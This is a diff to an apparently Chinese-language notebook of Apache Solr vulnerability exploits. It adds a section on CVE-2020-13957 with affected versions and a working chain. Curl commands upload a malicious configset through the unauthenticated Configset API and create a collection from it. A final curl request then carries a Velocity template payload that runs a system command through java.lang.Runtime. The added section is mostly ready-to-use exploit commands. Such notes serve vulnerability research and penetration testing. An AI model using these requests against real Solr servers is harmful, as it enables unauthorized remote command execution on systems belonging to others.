@@ -12,6 +12,7 @@ Apache Solr为世界上许多最大的互联网站点提供搜索和导航功能
 	3.CVE-2019-17558
 	4.CVE-2017-12629
 	5.CVE-2019-12409
+	6.CVE-2020-13957
 
 ## CVE-2019-0193
 Apache Solr DataImportHandler RCE
@@ -413,3 +414,45 @@ meterpreter >
 ### 工具利用
 https://github.com/siberas/sjet
 
+
+## CVE-2020-13957
+
+### 影响版本
+
+Apache Solr 6.6.0 - 6.6.5
+
+Apache Solr 7.0.0 - 7.7.3
+
+Apache Solr 8.0.0 - 8.6.2
+
+### 漏洞利用
+
+Apache Solr Configset Api上传功能存在未授权漏洞。攻击者可以上传含有恶意配置的solrconfig.xml从而触发CVE-2019-17558进行命令执行（SolrCloud模式才可利用）
+
+1.首先构造含有恶意配置的myconfigset.zip
+
+![5](10.png)
+
+2.上传myconfigset.zip进入ZooKeeper
+
+```
+curl -X POST --header "Content-Type:application/octet-stream" --data-binary @myconfigset.zip "http://localhost:8983/solr/admin/configs?action=UPLOAD&name=test3myConfigSet"
+```
+
+![5](11.png)
+
+3.从Zookeeper中选择恶意的solrconfig.xml创建新的Collection
+
+```
+curl -v "http://localhost:8983/solr/admin/collections?action=CREATE&name=newCollection3&numShards=2&replicationFactor=1&wt=xml&collection.configName=test3myConfigSet"
+```
+
+![5](12.png)
+
+4.EXP命令执行
+
+```
+curl -v "http://127.0.0.1:8983/solr/newCollection3/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+```
+
+![5](13.png)
